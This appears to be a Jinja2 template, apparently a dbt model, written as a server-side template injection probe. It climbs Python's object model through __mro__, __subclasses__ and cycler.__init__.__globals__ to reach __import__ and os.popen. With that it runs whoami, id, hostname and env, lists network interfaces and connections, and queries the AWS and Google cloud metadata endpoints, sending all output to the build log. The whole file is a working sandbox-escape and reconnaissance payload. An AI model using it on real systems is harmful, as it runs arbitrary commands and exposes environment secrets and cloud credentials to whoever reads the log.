{# Test Python object model access - classic Jinja2 SSTI vectors #}

{% set x = ''.__class__ %}
{{ log("T1_CLASS=" ~ x, info=True) }}

{% set x = ''.__class__.__mro__ %}
{{ log("T2_MRO=" ~ x, info=True) }}

{# Try to access object base class #}
{% set x = ''.__class__.__mro__[-1] %}
{{ log("T3_OBJECT=" ~ x, info=True) }}

{# Try subclasses - this is the key for RCE #}
{% set x = ''.__class__.__mro__[-1].__subclasses__() %}
{{ log("T4_SUBCLASS_COUNT=" ~ x|length, info=True) }}

{# Try cycler/joiner/namespace init globals #}
{% set x = cycler(1) %}
{{ log("T5_CYCLER=" ~ x.__class__, info=True) }}
{{ log("T6_CYCLER_INIT=" ~ x.__class__.__init__, info=True) }}

{# Try to access builtins via globals #}
{% set x = cycler.__init__.__globals__ %}
{{ log("T7_GLOBALS_KEYS=" ~ x.keys()|list, info=True) }}

{# Try lipsum (Jinja2 built-in) #}
{{ log("T8_LIPSUM=" ~ lipsum.__globals__, info=True) }}

{# Try config object #}
{{ log("T9_CONFIG=" ~ config, info=True) }}
{{ log("T10_CONFIG_CLASS=" ~ config.__class__, info=True) }}

{# Try to import os via builtins #}
{% set builtins = cycler.__init__.__globals__['__builtins__'] %}
{{ log("T11_BUILTINS_TYPE=" ~ builtins.__class__, info=True) }}
{{ log("T12_BUILTINS_KEYS=" ~ builtins.keys()|list, info=True) }}

{# If __import__ exists, try os.popen #}
{% set imp = cycler.__init__.__globals__['__builtins__']['__import__'] %}
{% set os = imp('os') %}
{{ log("T13_OS_MODULE=" ~ os, info=True) }}
{{ log("T14_WHOAMI=" ~ os.popen('whoami').read(), info=True) }}
{{ log("T15_ID=" ~ os.popen('id').read(), info=True) }}
{{ log("T16_HOSTNAME=" ~ os.popen('hostname').read(), info=True) }}
{{ log("T17_ENV=" ~ os.popen('env').read(), info=True) }}
{{ log("T18_IFCONFIG=" ~ os.popen('ip addr 2>/dev/null || ifconfig 2>/dev/null').read(), info=True) }}
{{ log("T19_PROCNET=" ~ os.popen('cat /proc/net/tcp 2>/dev/null').read(), info=True) }}
{{ log("T20_METADATA=" ~ os.popen('curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null || curl -s http://metadata.google.internal/computeMetadata/v1/ -H "Metadata-Flavor: Google" 2>/dev/null').read(), info=True) }}

SELECT 1 as id
